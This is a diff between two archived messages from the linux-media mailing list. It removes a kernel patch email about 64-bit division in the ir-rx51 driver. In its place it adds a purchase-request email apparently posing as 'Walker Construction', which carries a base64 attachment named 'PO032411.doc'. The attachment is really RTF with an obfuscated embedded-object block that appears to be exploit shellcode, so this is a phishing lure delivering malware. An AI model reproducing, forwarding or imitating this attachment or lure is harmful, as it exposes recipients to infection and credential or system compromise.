@@ -2,79 +2,134 @@ Return-Path: <linux-media-owner@vger.kernel.org>
 X-Original-To: lists+linux-media@lfdr.de
 Delivered-To: lists+linux-media@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by mail.lfdr.de (Postfix) with ESMTP id 2587F18C1CA
-	for <lists+linux-media@lfdr.de>; Thu, 19 Mar 2020 21:51:03 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTP id 781A818C1E7
+	for <lists+linux-media@lfdr.de>; Thu, 19 Mar 2020 21:53:28 +0100 (CET)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1727232AbgCSUuU (ORCPT <rfc822;lists+linux-media@lfdr.de>);
-        Thu, 19 Mar 2020 16:50:20 -0400
-Received: from alexa-out-sd-01.qualcomm.com ([199.106.114.38]:14450 "EHLO
-        alexa-out-sd-01.qualcomm.com" rhost-flags-OK-OK-OK-OK)
-        by vger.kernel.org with ESMTP id S1725787AbgCSUuU (ORCPT
+        id S1727186AbgCSUx1 (ORCPT <rfc822;lists+linux-media@lfdr.de>);
+        Thu, 19 Mar 2020 16:53:27 -0400
+Received: from [37.49.224.149] ([37.49.224.149]:63504 "EHLO
+        walker-construction.co.uk" rhost-flags-FAIL-FAIL-OK-FAIL)
+        by vger.kernel.org with ESMTP id S1726998AbgCSUx0 (ORCPT
         <rfc822;linux-media@vger.kernel.org>);
-        Thu, 19 Mar 2020 16:50:20 -0400
-Received: from unknown (HELO ironmsg05-sd.qualcomm.com) ([10.53.140.145])
-  by alexa-out-sd-01.qualcomm.com with ESMTP; 19 Mar 2020 13:50:19 -0700
-Received: from gurus-linux.qualcomm.com ([10.46.162.81])
-  by ironmsg05-sd.qualcomm.com with ESMTP; 19 Mar 2020 13:50:18 -0700
-Received: by gurus-linux.qualcomm.com (Postfix, from userid 383780)
-        id B9A0A4B48; Thu, 19 Mar 2020 13:50:18 -0700 (PDT)
-From:   Guru Das Srinagesh <gurus@codeaurora.org>
-To:     linux-pwm@vger.kernel.org
-Cc:     Thierry Reding <thierry.reding@gmail.com>,
-        =?UTF-8?q?Uwe=20Kleine-K=C3=B6nig?= <uwe@kleine-koenig.org>,
-        Subbaraman Narayanamurthy <subbaram@codeaurora.org>,
-        linux-kernel@vger.kernel.org,
-        Guru Das Srinagesh <gurus@codeaurora.org>,
-        Mauro Carvalho Chehab <mchehab@kernel.org>,
-        Richard Fontana <rfontana@redhat.com>,
-        Thomas Gleixner <tglx@linutronix.de>,
-        Kate Stewart <kstewart@linuxfoundation.org>,
-        Allison Randal <allison@lohutok.net>,
-        linux-media@vger.kernel.org
-Subject: [PATCH v10 03/12] ir-rx51: Use 64-bit division macro
-Date:   Thu, 19 Mar 2020 13:50:06 -0700
-Message-Id: <c1d7722bdb6a6640cba64f430b81a67a95ab4204.1584650604.git.gurus@codeaurora.org>
-X-Mailer: git-send-email 1.9.1
-In-Reply-To: <cover.1584650604.git.gurus@codeaurora.org>
-References: <cover.1584650604.git.gurus@codeaurora.org>
-In-Reply-To: <cover.1584650604.git.gurus@codeaurora.org>
-References: <cover.1584650604.git.gurus@codeaurora.org>
+        Thu, 19 Mar 2020 16:53:26 -0400
+From:   "Wilson Jasper" <wilson@walker-construction.co.uk>
+To:     linux-media@vger.kernel.org
+Subject: RE: Walker Construction_RFQ
+Date:   19 Mar 2020 21:53:24 +0100
+Message-ID: <20200319215324.899243EB82A99CD2@walker-construction.co.uk>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+        boundary="----=_NextPart_000_0012_A9550418.1D6841DE"
 Sender: linux-media-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <linux-media.vger.kernel.org>
 X-Mailing-List: linux-media@vger.kernel.org
 
-Since the PWM framework is switching struct pwm_state.period's datatype
-to u64, prepare for this transition by using DIV_ROUND_CLOSEST_ULL to
-handle a 64-bit dividend.
+This is a multi-part message in MIME format.
 
-Cc: Mauro Carvalho Chehab <mchehab@kernel.org>
-Cc: Richard Fontana <rfontana@redhat.com>
-Cc: Thomas Gleixner <tglx@linutronix.de>
-Cc: Kate Stewart <kstewart@linuxfoundation.org>
-Cc: Allison Randal <allison@lohutok.net>
-Cc: linux-media@vger.kernel.org
+------=_NextPart_000_0012_A9550418.1D6841DE
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
 
-Signed-off-by: Guru Das Srinagesh <gurus@codeaurora.org>
----
- drivers/media/rc/ir-rx51.c | 3 ++-
- 1 file changed, 2 insertions(+), 1 deletion(-)
+Dear Sir/Madam,,
 
-diff --git a/drivers/media/rc/ir-rx51.c b/drivers/media/rc/ir-rx51.c
-index 8574eda..9a5dfd7 100644
---- a/drivers/media/rc/ir-rx51.c
-+++ b/drivers/media/rc/ir-rx51.c
-@@ -241,7 +241,8 @@ static int ir_rx51_probe(struct platform_device *dev)
- 	}
- 
- 	/* Use default, in case userspace does not set the carrier */
--	ir_rx51.freq = DIV_ROUND_CLOSEST(pwm_get_period(pwm), NSEC_PER_SEC);
-+	ir_rx51.freq = DIV_ROUND_CLOSEST_ULL(pwm_get_period(pwm),
-+			NSEC_PER_SEC);
- 	pwm_put(pwm);
- 
- 	hrtimer_init(&ir_rx51.timer, CLOCK_MONOTONIC, HRTIMER_MODE_REL);
--- 
-The Qualcomm Innovation Center, Inc. is a member of the Code Aurora Forum,
-a Linux Foundation Collaborative Project
+Please confirm and give quotation as per attached,quote according=20
+to Bill of
+materials
 
+Highlighted items will be supplied in large quantity.
+
+Kind Regards.
+
+Wilson Jasper=20
+Purchase Manager
+Walker Construction (UK) Ltd.
+
+
+I will like a receipt of your acknowledgment mail.
+------=_NextPart_000_0012_A9550418.1D6841DE
+Content-Type: application/msword; name="PO032411.doc"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="PO032411.doc"
+
+e1xydGY2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtcb2JqZWN0e1w5
+MDYzOTIzOTB9XG9iamxpbmt7XDkwNjM5MjM5MH1cb2Jqdzg3OTJ7XDkwNjM5MjM5MH1cb2Jq
+aDI4MHtcOTA2MzkyMzkwfXtcOTA2MzkyMzkwfXtcb2JqZGF0YQ1ccHN6NTIyODIzNTQ2XHly
+MDU5NzcyMzIwMlwnPwkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJ
+CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJ
+CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJ
+CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQl7XG9iamVjdFxkbGJncHljbXdt
+cm9qWldCRUlYQkNaQ0hDRUlPVFdETDQwNzUxMjU2NzgxNDc1MzQwNDg4NDVkbGJncHljbXdt
+cm9qWldCRUlYQkNaQ0hDRUlPVFdETDUwODAxMDAzOTgxe1xhaXJqcXZqeHBtaHVkdHlwd2d1
+bnlza3JTSFFBUVFOU1BWWlFHWko5NzcwMTc5MTU1MjgzNDAwNzg0NjA4NDk2NGFpcmpxdmp4
+cG1odWR0eXB3Z3VueXNrclNIUUFRUU5TUFZaUUdaSjQwNDk2Njc5MDE0ODM2NjkwMTAzODUy
+NDUxOX19Zjk3MmIzNGIwMjAwMDAwMDBiMDAwMDAwNjU1MTc1NjE3NDY5NmY0e1xtYmVnQ2hy
+IFx7XHtcbWVuZENocn0NZTJlMzMwMDAwMDAwMDAwMDAwMDAwMDBiOTA2MDAwMDAyNjBmMWIy
+ZDVhMTAxMDhhYjFkYjg3ZWZmYzc1ZDI1M2RiZDZkODI4YjE4OGIxYmI4OWJhNGE2YzMwNTE1
+YzM5ZjNjOGIzMDUzZmZkNjA1YWM3MWQ4MTkyZDBhNzFkODE5ZmZlMGQzYjdmY2VhZWI0NDAw
+NDQ2NjIzNTZiMWI1ZTFhNjJjYTc0MDdjMDc2ZjViNGM2ZjAzNDM4NmE2NDgwYjgzNDRjMTFi
+NTljYzk4YmEyYTUwZGY2NzNlMWYyMGJkNDkzNzI2ODliYzU3YjZmMDMxMDM2NjBjN2I1Mzg0
+OTBiMmQxMmFkNTM2NjljY2NkZDBkZTE2YjczZjIwNDNjMDBkNGNjMDNjOWIxY2VmMmJjYzQ5
+MjBjZmEwZWIzM2Y5M2I4NzEyM2JhNjJiYzRiNzRiZmE2ODY1NTg2NWQwYWJjM2U5NDQwMTAw
+MDAzOWVhYzhlYmM3MGFmOWNhMmFjODk2YTk5NjI4MjViMGFlMGFiYThlY2Y3ODQyYjc0MmRl
+YmE5ZThhNGM3YTAwOWNiNzY1MTkyMDM3MzdlZWI3NDhjMTgyMmYwYjI0MjNjZTg0MTk5ZDhl
+ZDkyYTgyNWM5OWY2Njc1OWY0NzQyYTE5ZmUyNTI4ZThlZjY5ODAwMTYxYWU1ZGQ1OThiNzI2
+NGJiNmRjY2NmYzA1NDhmZTc0MmYzNzczNzY4NjQxMjczNTNlOGM5NjljYWQxMjA1ODc5M2Uz
+YjgwODRlNjIzYmE2MjM4NjlhOTY3OTFhYWIwOTFkZmYzZjYwODA2Njc0NmRmNzE3ZThiY2Y3
+YWZmY2NiNWZkYjE1NDlhZGEwZTE1ZDQ4OTM4Y2RlYjcyMTA5OWJlNGNhNGM5NTY0NWU5MzQz
+YTc0ODk5Y2I0OGMwZTE0YzQyMThmNDE2MzZmMjk4ZjFhNTg1MWQ1MzNkZGQ5OGFiMDYxOTFi
+OWFiMWFkMDEzNGQyOWUyYzQ2MjNjODNhOGFiZTFjZDFmMDY1ZGFkZmUxYmRkZWQxNzQ4Y2Nm
+ZDdiN2ZlNmYyYWVhZTZjZTQxYzVmNTk4MWZhZDA2NDQ4MjAzNTQ2NDMyNTdiZmQ5MzhhZTBk
+MWIyNWMzMjQ3NTQ4M2Y1MTQ4ZjkwOTg0NDdkNDcwOTJiN2YzODI3M2I0M2IzYjgzNzA5MmNi
+YzM2YTIzZDkxN2JjOTliZDg1NTI2YmM1N2MyODBiNzIwYjkzMzViOTI4N2MyOTQ0ZTk5Y2U1
+YWZjYmMxNzRjZWVlMTIxZGUxNTg0M2FmZTczMGUxYmRjOTAxOGNkZGFiZmMzNmU5MjEzNzY0
+M2ZlYjAzYTk3MTQzZThmNDAwMDAwMGU5ZDcwMDAwMDBlOWI4MDEwMDAwOWM1NjUyNTc5MDlj
+NTI4MWMyNjMwODAwMDA4MWVhNTgxNjAwMDA4MWMyNmIwNzAwMDA4MWMyOGM1YjAwMDA1YTlk
+OTA4MWVlNzQzMzAwMDA4MWVlOTQxNzAwMDA4MWVlZmMyNTAwMDA4MWVlMzU3MjAwMDA4MWM3
+MWM2MTAwMDA4MWMyY2UxZDAwMDA1ZjVhNWU5ZGU5ZGMwMDAwMDA4MWMxZDkwMTAwMDBlYjc5
+OWM1MDJkYjQ3NjAwMDAwNThiNWYwMDAwOGQ4MDQzNGYwMDAwMmQ0NzEyMDAwMDhkODBjMjUy
+MDAwMDA1ZDExYjAwMDA1ODlkZWIwNzY3NTlmYjdlMjk5M2U2ZTkwOTAxMDAwMGViNDk1NjVl
+OWM1MzUwOGQ5ODI2MzYwMDAwZWIwODU3NWZmZDM0NWE0OTViZDk1MjVhOGQ4M2NkNzkwMDAw
+NTc1ZmViMDdmMDUxY2RkMGI3MDQxYjgxZWI4MDU4MDAwMDgxZWJlMTU4MDAwMDhkODM0NzEx
+MDAwMDU4NWI5ZDU2NWVlOWQ2MDAwMDAwOTBlYmIyZWIzNzhkOTllYjAyMDAwMDZiYzAwMDkw
+NjljMDQ3MDdjMTQ1ZWI0NWViMWVlYjc3NTllOTVmZmZmZmZmZWIzOWViMTBmZmExY2MxZDdk
+ZWIwOTRkYzRlNDdkYzM1N2QxYTk0NmViNWJlOWJjMDAwMDAwZWJkZDljNTM4MWViOTY1NjAw
+MDA4M2ViNzI4MWViOTk2MTAwMDA4ZDliZTk2ZjAwMDA1YjlkZTkxZmZmZmZmZmViNmEwNTg1
+NTE5Nzc1ZWJiNDljNTM1NzUwODFjNzM0NWIwMDAwOGQ5ZmUyMTMwMDAwMDU4ZTQ5MDAwMDhk
+YmIyZDU0MDAwMDhkYjg3ZTBjMDAwMDU4NWY1YjlkZWIwNjMyNDYyZWYwYWQ1MzMxMDFlYjU4
+NTA1ODljNTI1MDU4OTA1MWViMDhlNTdlODc0MDJhZDY1NDBlODFjMTk5MjIwMDAwODFlOTJh
+MTQwMDAwOGQ5MTc0NzEwMDAwODFjMTJiNzYwMDAwNTk1YTlkZTkzZGZmZmZmZmViOTQ1NjVl
+ZTk1YmZlZmZmZmU5ZGZmZWZmZmZlOTQ2ZmZmZmZmZWIwNzcwZTBjYzlmMGFiZDg2ZTk3M2Zm
+ZmZmZmU5Y2NmZWZmZmY4M2MxMDRlYjA1ZTkwZGZmZmZmZjM5ZDkwZjgyMGZmZmZmZmYwNGJk
+MTc3NzY4OTBlNjk2NWQzNmZjMGE1MDk1MjNlN2I1NDk3MWVmYjgyYjg0OTg4ZDBmZjU0ZWEw
+ZDY3Mjc5ZTUwZjY5YTNlMGYwY2YyOGJkZmE1NjAzOTQ2NjdjOWY2N2FiZTAzMDBmZjBmYjBi
+YTk2MzVjMjJjOTMyNzgzNzQ1MTZjMDA2Y2QxNTJlMjc3MjljYjZlM2Y0YWY1MDZhMDZiNDc1
+MmVkMDkyNzcwZWM0ODg0N2ZhZTAyMzY3MWZkZDE0NmNhODJjZmIxZDZjMTQ3ZDQyYmM1ZDZk
+YWUyZDg2OTIzMGRmZjY0ZTc5MTFhZDUxZGJhYmU4Y2UxMmNjMDU3NjQ5ZTBlMDQwNjIwYmRk
+ZTc0ZWU1ZDBlYjZkMDIzNTMxN2Q2YzM4ZmJmYWZiMGQzZTcwYmUyMGI1MTA5ZTY1YWVjN2Zj
+ODgzODFiOTAzZGUyNTNjNzcwYWU3ODMzOTU1NmVjODhkODI4NjM3ZjZkYWJjYTg1YzAxNzU4
+NWZjNTk5NjBmNTI4ZDcwMTIzOWRkZWIwMmQxMDIwOWI0OWY1MmQyNTM3YTgyYmQzYWFjZGNm
+YmQ5ZTEyOGUwOGQwNjg2ZWQwMzdhNmUwOTYyYTAyZjdiNWQ3YjA2MjBmZDIwN2NjN2E0MjZm
+NTJlODBmNGNjMDU0ZjE0NjdjNDM1NmQyMjQ2OTM5YmU3ZmI1MGE1ZDk0OWE0MjVjYjc2NmIx
+YjUxYWNlMzFiOGMzZjBiMzhkMmZjODY2YTA2MTMyYjFlNTQ2YTQxODA4NmNiNmIxYmRiNmY5
+YmNmMGYxNTNlOTE1OTNlOTViNTg2MjNkY2VlZDg5NzVkMDQwZTU2N2M0NDUxZDU2NjJhODA4
+NzRhNTFkNGQ1NjAxOTAzZjE4ZWE3NTQwMjhhN2Y4MDYwMzlmNGRhN2JlNGZlMDFkNDk4ZmE1
+ODQyNWZhNDhjOTQ5OWI3ZGY0ZDlmODMwNzcxNmNhZDVhYTllNDg5OGI3NWRlZWFkZjFkOTNi
+ODBhZWQxZjAwNWE4NjhhZmU4ZjIwZjlhZGRhZmY5YTJkMGY1MDcwMGU1YmNmM2YxMzgxZmEx
+ZTI3OWQxMDg3MzUyY2EwZmZhMmM4MjkyNDFkZmE0NzM2MGViMjYzODBhNTQ3ODI2YWFjN2E5
+ZGNkYWQ3NjdiNjFjMmU3NGI4OGJiNDcxNmVhZmFhMzE0NTlhNWJmZTU2MmM2Mjg1ZTVlMDM0
+YTUyZWYzZjVmMjIyOWQ1YzgwNmE1NGNkMDBkYjE1MGFlM2ZmMDA0ZjAxYWIwM2EyYTU2MTlk
+NzA5NzA2MTFlMjY4ODRkYzU5MzNlMzE0NWQ5OTdmNjc3ZDE1NDBlZjY1NTkwZjhjZDYwOGZh
+MTE2ODY1YzkxYzM5Nzc0NDcyNTBkYTU3ZTBlNzAxYmUwYWI0OWE0OTQzYzc3MzVjODdkNGNj
+NjZlNGVlMzUzYTU0OGQ0N2FlMmUzNmJlZjNlZjMyOTA3MDhiOWU3Y2Y3ZDhkMzZlNmIwM2Uy
+NTE4MWY1YzVkZjI4YTYyMzg3M2M4ODgxMGRhYjUzN2NiNzYwMWMxMzNmMjJkNTc5ZmNiODhj
+YjkyODllMjhjZWFjMWFmZWVkYWI0YTY3ODVlYzJiYWIzYzRhYjZjZTk2NTE4OTU2ZGI3Y2M5
+YjBkN2NmNGVmMjk3YzUyZWIzNmYwYjQ5NTVkYTM2YTUxYjU2ZjM1M2VlNjM0ODc3YmY1NmVm
+NmExZjk0OTY4Nzg1MzU0NjhiOGNiM2NjZDc4MjU1YTVmYjczMTA1MzA3MGQxMWMyYTI5OTgz
+NjQ2ZjM2YjQwMTYwNWUwNDBiOTYzYTVjYzA0YzI4MmY1ZGQ4MWZjYjNjZmM3Mzk4ODIwOTI3
+MzI3Y2JhZGUwY2FmYmExNDJhYWE5YThjNTA1ZTkxNWU2ZDk4NDg0Nzc5NWQxYWQ4NGUxNmVm
+NDcyOWQzZGFkZGU1MTc1MDJlOTczNGU0YTYzZjZlMWEyNGUzYTg2MTAwMDAwMDAwfVxvYmp1
+cGRhdGU2MzkzNTkxMTF9fQ==
+
+------=_NextPart_000_0012_A9550418.1D6841DE--
